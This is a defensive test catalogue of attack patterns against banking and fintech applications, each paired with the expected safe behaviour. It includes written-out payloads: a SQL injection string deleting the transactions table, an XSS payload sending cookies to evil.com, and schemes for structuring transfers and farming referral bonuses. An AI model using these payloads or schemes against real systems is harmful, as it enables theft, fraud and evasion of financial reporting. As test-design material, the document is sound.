# Domain Attack Library: Banking / FinTech

**Forge Protocol — Gate 3 Adversarial Testing**
**Source:** Industry patterns + Forge Protocol cognitive rules
**Last updated:** 2026-04-11

---

## 1. Data Integrity Attacks

### 1.1 Threshold Splitting (Structuring)
- **Attack:** Split a large transaction into multiple smaller ones to evade reporting thresholds
- **Payload:** Instead of one $10,000 transfer, submit 4 x $2,499 transfers in quick succession
- **Safe behavior:** System aggregates transactions per user per time window. Flag when cumulative amount exceeds threshold.

### 1.2 Concurrent Balance Race Condition
- **Attack:** Submit two withdrawals simultaneously when only enough balance for one
- **Payload:** Balance: $100. Two concurrent `POST /transfer {"amount": 80}` requests
- **Safe behavior:** Atomic balance check + debit via database transaction (SELECT FOR UPDATE or serializable isolation). One succeeds, one fails.

### 1.3 Exchange Rate Drift Exploitation
- **Attack:** Lock in favorable exchange rate, delay execution until rate moves favorably
- **Payload:** Get quote at rate 1.10, submit order 30 minutes later hoping rate is now 1.15
- **Safe behavior:** Quotes expire after short window (30s-5min). Rate re-validated at execution time.

### 1.4 Negative Amount Transfer
- **Attack:** Transfer negative amount to reverse money flow
- **Payload:** `{"from": "victim", "to": "attacker", "amount": -500}`
- **Safe behavior:** Amount must be positive. Strict server-side validation.

### 1.5 Floating Point Precision Attack
- **Attack:** Exploit floating point arithmetic to create money from rounding
- **Payload:** Transfer $0.001 repeatedly, exploiting rounding to accumulate fractions
- **Safe behavior:** Use integer arithmetic (cents/minor units). Never floating point for money.

---

## 2. Auth/Access Bypass

### 2.1 KYC Interruption Attack
- **Attack:** Start KYC process, reach a partially-verified state, access restricted features
- **Payload:** Complete step 1 of 3 KYC, attempt to make transfers (which require full KYC)
- **Safe behavior:** KYC status is atomic: unverified or verified. No partial states grant access.

### 2.2 Session Fixation
- **Attack:** Set a known session ID before victim logs in, then hijack the session
- **Payload:** Pre-set session cookie, victim authenticates, attacker uses same session
- **Safe behavior:** Regenerate session ID on authentication. Invalidate pre-auth sessions.

### 2.3 Account Enumeration via Login
- **Attack:** Determine which email addresses have accounts based on login error messages
- **Payload:** `POST /login {"email": "test@example.com"}` — check if error says "wrong password" vs "account not found"
- **Safe behavior:** Generic error: "Invalid email or password" for both cases. Same response time.

### 2.4 2FA Bypass via Backup Code Reuse
- **Attack:** Reuse a backup code that was already consumed
- **Payload:** Submit the same backup code twice
- **Safe behavior:** Mark backup codes as consumed immediately. One-time use enforced at database level.

### 2.5 Cross-Account API Key Leakage
- **Attack:** Use API key from Account A to access Account B's transactions
- **Payload:** `GET /api/accounts/{account_b_id}/transactions` with Account A's API key
- **Safe behavior:** API key scoped to specific account(s). All queries filter by key's account scope.

---

## 3. Injection Attacks

### 3.1 SQL Injection via Transaction Search
- **Attack:** Inject SQL through transaction search/filter fields
- **Payload:** `{"description_contains": "'; DELETE FROM transactions; --"}`
- **Safe behavior:** Parameterized queries. ORM-based filtering with sanitized inputs.

### 3.2 XSS via Transaction Description
- **Attack:** Embed JavaScript in payment description that executes when viewed
- **Payload:** `{"description": "<img src=x onerror='fetch(\"evil.com/steal\"+document.cookie)'>"}`
- **Safe behavior:** HTML escaped on render. CSP headers prevent inline script execution.

### 3.3 IBAN/Account Number Format Abuse
- **Attack:** Submit malformed IBANs that pass basic validation but cause downstream errors
- **Payload:** `{"iban": "GB99AAAA00000000000000"}` (valid format, invalid check digits)
- **Safe behavior:** Full IBAN validation including check digit verification (ISO 13616).

### 3.4 Unicode Homoglyph in Beneficiary Name
- **Attack:** Use visually similar Unicode characters to impersonate a known beneficiary
- **Payload:** Beneficiary: "Аmazon" (Cyrillic А looks like Latin A)
- **Safe behavior:** Normalize Unicode to ASCII for matching. Alert on mixed-script names.

---

## 4. Business Logic Abuse

### 4.1 Overdraft Exploitation
- **Attack:** Exploit timing between balance check and debit to overdraw account
- **Payload:** Large withdrawal at exact moment incoming transfer is being processed
- **Safe behavior:** Pessimistic locking on balance modifications. Balance never goes below floor.

### 4.2 Fee Avoidance via Micro-Transactions
- **Attack:** Split transactions to stay below fee thresholds
- **Payload:** Instead of one $1000 transfer (fee: $5), do 100 x $10 (fee: $0 each)
- **Safe behavior:** Aggregate fee calculation per time period. Monthly fee floor.

### 4.3 Referral Bonus Farming
- **Attack:** Create multiple accounts to earn referral bonuses
- **Payload:** 50 signups with different emails but same device/IP/phone
- **Safe behavior:** Device fingerprinting + phone verification + cooldown period between referrals.

### 4.4 Interest Rate Arbitrage
- **Attack:** Exploit delay between interest rate announcement and application
- **Payload:** Deposit large amount seconds before new higher rate takes effect
- **Safe behavior:** Interest rate changes apply at defined settlement times. No early access.

### 4.5 Chargeback Abuse
- **Attack:** Complete transaction, receive goods/service, then dispute the charge
- **Payload:** Legitimate purchase followed by "unauthorized transaction" claim
- **Safe behavior:** Transaction logging with device fingerprint, IP, 2FA confirmation. Evidence package for dispute resolution.

---

## 5. Information Leakage

### 5.1 Balance Exposure in Error Messages
- **Attack:** Trigger error that reveals account balance in the error response
- **Payload:** Overdraft attempt: `{"amount": 999999}` — check if error says "insufficient balance of $X"
- **Safe behavior:** Generic error: "Insufficient funds" without revealing actual balance.

### 5.2 Transaction History in Logs
- **Attack:** Check that transaction amounts, account numbers, and beneficiary details aren't in plaintext logs
- **Payload:** N/A (audit test)
- **Safe behavior:** Logs contain transaction IDs only. Amounts and account numbers masked.

### 5.3 API Response Timing Side Channel
- **Attack:** Measure response time to determine if an account exists
- **Payload:** Time `GET /api/accounts/exists` for real vs fake account numbers
- **Safe behavior:** Constant-time comparison. Same response time regardless of account existence.

### 5.4 PDF Statement Information Leakage
- **Attack:** Generate statement PDF that includes hidden metadata with internal system info
- **Payload:** Inspect PDF metadata (author, creation tool, internal paths)
- **Safe behavior:** Strip all metadata from generated PDFs. No internal paths or tool info.

---

## Test Implementation Notes

- ALL monetary calculations must use integer arithmetic (cents/minor units)
- Test concurrent transactions with database-level isolation (not just API-level)
- Test IBAN validation with all country formats (ISO 13616 test vectors)
- Verify constant-time responses for auth-related endpoints
- Test exchange rate handling with precision edge cases (many decimal places)
- PCI DSS: Never log full card numbers, CVV, or PIN blocks — even in test environments
